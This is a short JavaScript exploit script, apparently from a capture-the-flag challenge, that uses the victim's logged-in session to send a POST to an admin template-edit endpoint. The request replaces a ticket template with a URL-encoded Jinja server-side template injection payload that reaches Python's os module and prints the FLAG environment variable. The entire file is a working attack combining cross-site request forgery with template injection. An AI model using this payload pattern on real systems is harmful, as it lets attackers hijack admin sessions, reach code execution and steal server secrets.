console.log("Started xploit")
let x = fetch("/admin/templates/1/edit", {
  "body": "name=Default+Ticket+Template&html_content=%3Ch1%3E%7B%7B+request.application.__globals__.__builtins__.__import__%28%27os%27%29.environ.get%28%27FLAG%27%29+%7D%7D%3C%2Fh1%3E%3Cp%3E%7B%7B+buyer_name+%7D%7D%3C%2Fp%3E%3Cp%3E%7B%7B+ticket_code+%7D%7D%3C%2Fp%3E&is_default=on",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
console.log("Done")
